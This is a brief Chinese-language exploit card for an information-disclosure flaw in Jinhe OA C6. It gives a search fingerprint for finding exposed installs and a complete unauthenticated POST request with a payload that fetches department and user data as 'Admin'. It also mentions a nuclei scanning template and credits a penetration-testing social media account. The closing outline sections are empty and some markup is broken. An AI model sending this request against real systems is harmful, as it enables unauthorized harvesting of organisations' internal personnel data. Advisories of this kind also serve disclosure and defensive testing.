# 金和OAC6GetDepartDataByDeptID存在信息泄露漏洞

- **系统**：金和OA　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 101`　`Content-Type: text/plain;charset=UTF-8`

**请求体 / payload**
```
strDeptID=
strUserId=Admin
strUserEsp=
strArchivesId=
deptIds=
IsShowChildrenDept=0
IsCascade=1

nuclei脚本\
\[金和OA-userwebcontrol-userselect-ajaxservicemethod-userwebcontrol-userselect-信息泄露.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 金和OA C6 GetDepartDataByDeptID存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA